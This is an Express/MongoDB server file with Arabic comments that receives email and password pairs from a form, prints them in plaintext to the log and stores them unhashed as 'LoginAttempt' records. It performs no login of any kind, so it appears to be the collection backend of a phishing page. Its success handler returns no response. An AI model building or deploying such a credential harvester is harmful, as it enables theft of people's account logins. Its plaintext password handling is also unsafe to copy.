const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();

// إعدادات قراءة البيانات المرسلة من النماذج و JSON
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// مسار المجلد الذي يحتوي على ملفات الواجهة (index.html و CSS)
app.use(express.static(path.join(__dirname, 'public')));

// رابط قاعدة بيانات MongoDB من المتغيرات البيئية في Render
const MONGO_URI = process.env.MONGO_URI;

mongoose.connect(MONGO_URI)
  .then(() => console.log('✓ تم الاتصال بقاعدة بيانات MongoDB بنجاح'))
  .catch(err => console.error('✗ خطأ في الاتصال بـ MongoDB:', err));

// تعريف مخطط حفظ البيانات
const LoginAttemptSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
  date: { type: Date, default: Date.now }
});

const LoginAttempt = mongoose.model('LoginAttempt', LoginAttemptSchema);

// مسار استقبال البيانات وحل مشكلة Cannot POST /
app.post('/', async (req, res) => {
  try {
    const { email, password } = req.body;

    console.log('بيانات جديدة مستلمة:', { email, password });

    // حفظ البيانات في MongoDB
    const entry = new LoginAttempt({ email, password });
    await entry.save();

   
  } catch (err) {
    console.error('Erorr:', err);
    res.status(500).send(`
      <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 60px; direction: rtl;">
        <h2 style="color: #dc3545;">✗Erorr</h2>
        <p>${err.message}</p>
        <a href="/">حاول مرة أخرى</a>
      </div>
    `);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`السيرفر يعمل الآن على المنفذ: ${PORT}`);
});
